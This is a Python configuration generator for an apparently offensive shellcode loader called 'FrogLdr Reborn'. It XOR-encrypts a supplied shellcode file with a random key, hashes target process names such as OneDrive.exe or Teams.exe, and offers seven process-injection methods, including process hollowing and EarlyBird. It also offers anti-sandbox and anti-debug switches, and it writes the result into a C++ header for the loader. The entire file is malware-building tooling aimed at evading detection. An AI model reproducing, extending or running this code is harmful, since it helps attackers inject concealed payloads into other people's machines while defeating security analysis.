import argparse
import enum
from itertools import cycle
from os import urandom
from jinja2 import Environment, FileSystemLoader


class INJECTION_METHODS(enum.Enum):
    NtMapViewOfSection  = 1
    CreateRemoteThread  = 2
    ThreadHijacking     = 3
    AddressofEntryPoint = 4
    ProcessHollowing    = 5
    Doppleganger        = 6
    EarlyBird           = 7

def fnv1a_32(string: str) -> str:
    """
    returns the hex representation of a given input string
    after running through fnv hash algo
    """
    hash = 0x811c9dc5
    fnv_prime = 0x01000193
    for char in string:
        hash = (hash ^ ord(char)) * fnv_prime
        hash &= 0xffffffff # wrapping math

    return hex(hash)


def xor(plaintext: bytearray, key: bytearray) -> bytearray:
    """ Encrypt the input plaintext with a repeating XOR key.
    :param plaintext: bytearray containing our plaintext
    :return ciphertext: bytearray containing encrypted plaintext
    """
    return bytearray(a ^ b for (a, b) in zip(plaintext, cycle(key)))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Config generator for FrogLdr Reborn")
    parser.add_argument("shellcode", help="Path to shellcode file")
    parser.add_argument("method", choices=INJECTION_METHODS._member_names_, help="Method to use for process injection")
    parser.add_argument(
        "target", help="Process(es) to inject into if they're open, e.g. OneDrive.exe or OneDrive.exe,Teams.exe"
    )
    parser.add_argument("--antisandbox", action="store_true", help="Enable anti-sandbox")
    parser.add_argument("--antidebug", action="store_true", help="Enable anti-debug")
    parser.add_argument("--sleeptime", type=int, default=4000, help="Initial sleep time in milliseconds")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    environment = Environment(loader=FileSystemLoader("templates/"))
    template = environment.get_template("config.hpp")

    target_process_map = ", \\\n\t".join([fnv1a_32(i) for i in args.target.split(",")])
    target_process_map = target_process_map

    with open(args.shellcode, "rb") as f:
        #shellcode = ','.join("0x" + format(i, "02x") for i in f.read())
        shellcode_key = urandom(16)
        shellcode = ','.join("0x" + format(i, "02x") for i in xor(f.read(), shellcode_key))
        shellcode_key = ','.join("0x" + format(i, "02x") for i in shellcode_key)

    config = {}
    config["targetprocess"] = target_process_map
    config["injectionmethod"] = INJECTION_METHODS._member_map_[args.method].value
    config["shellcode"] = shellcode
    config["key"] = shellcode_key
    config["antisandbox"] = int(args.antisandbox)
    config["antisandbox_sleep_time"] = args.sleeptime
    config["antidebug"] = int(args.antidebug)

    file_content = template.render(config)
    with open("./AbleLdr/config.hpp", "w") as f:
        f.write(file_content)

    print("[+] Config generated!")